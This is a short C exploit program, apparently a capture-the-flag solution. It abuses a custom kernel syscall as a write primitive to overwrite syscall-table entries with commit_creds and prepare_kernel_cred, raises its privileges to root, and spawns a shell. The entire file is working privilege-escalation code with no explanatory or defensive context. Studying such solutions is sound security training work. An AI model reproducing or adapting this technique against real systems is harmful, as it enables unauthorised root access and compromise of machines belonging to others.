#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#define SYS_CALL_TABLE		0x8000e4e4
#define SYS_CALC		0xdf

unsigned int** sct;

int main(int argc, char** argv){
	unsigned long commit_creds;
	unsigned long prepare_kernel_cred;
	if(argc!=3) {
	    printf("Usage: %s commit_creds prepare_kernel_cred\n", argv[0]);
    	    exit(-1);
	}
    	sscanf(argv[1], "%lx", &commit_creds);
    	sscanf(argv[2], "%lx", &prepare_kernel_cred);
	// we get a write primitive!
	// yay lets overwrite syscalls with
	// commit_cred and prepare_kernel_cred
	sct=(unsigned int**)SYS_CALL_TABLE;
	syscall(SYS_CALC, 1, '*', commit_creds, &sct[25]); //commit_creds
	syscall(SYS_CALC, 1, '*', prepare_kernel_cred, &sct[13]); //prepare_kernel_cred
	//commit_creds(prepare_kernel_cred(0));
	syscall(25,syscall(13,0));
	system("/bin/sh");
	return 0;
}
